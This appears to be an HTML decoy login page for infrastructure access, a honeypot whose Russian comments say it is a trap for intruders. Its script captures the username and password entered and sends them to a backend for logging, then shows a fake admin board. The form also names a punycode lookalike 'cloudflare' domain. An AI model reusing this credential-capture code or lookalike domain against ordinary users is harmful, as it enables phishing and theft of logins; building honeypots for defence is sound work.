<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Infrastructure Login</title>
</head>
<body style="display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f6f9; font-family: Arial, sans-serif;">

    <div style="width: 300px; padding: 30px; background: white; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
        <h3 style="text-align: center; margin-bottom: 20px;">Infrastructure Login</h3>
        
        <form id="loginForm" action="https://xn----cloudflare-v1k3a8ar9juare2g8f.com" method="POST">
            <label style="font-size: 14px; display: block; margin-bottom: 5px;">Логин</label>
            <input type="text" name="username" id="username" placeholder="Введите логин" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            
            <label style="font-size: 14px; display: block; margin-bottom: 5px;">Пароль</label>
            <input type="password" name="password" id="password" placeholder="Введите пароль" required style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            
            <button type="submit" style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px;">Войти</button>
        </form>
    </div>
<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Останавливаем стандартную перезагрузку страницы

    const usernameInput = document.getElementById('username').value;
    const passwordInput = document.getElementById('password').value;

    // 1. Отправляем введенные данные на бэкенд, чтобы напарник их залогинил (IP, логин, пароль)
    fetch('/api/v1/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: usernameInput,
            password: passwordInput,
            timestamp: new Date().toISOString()
        })
    })
    .then(response => {
        // 2. После отправки логов сразу перенаправляем на панель администратора
        window.location.href = 'fake_admin_board.html'; // Либо 'fake_admin_board.html'
    })
    .catch(error => {
        // Даже если сеть моргнула, хакер всё равно должен провалиться в ловушку
        window.location.href = 'fake_admin_board.html';
    });
});
</script>
</body>
</html>
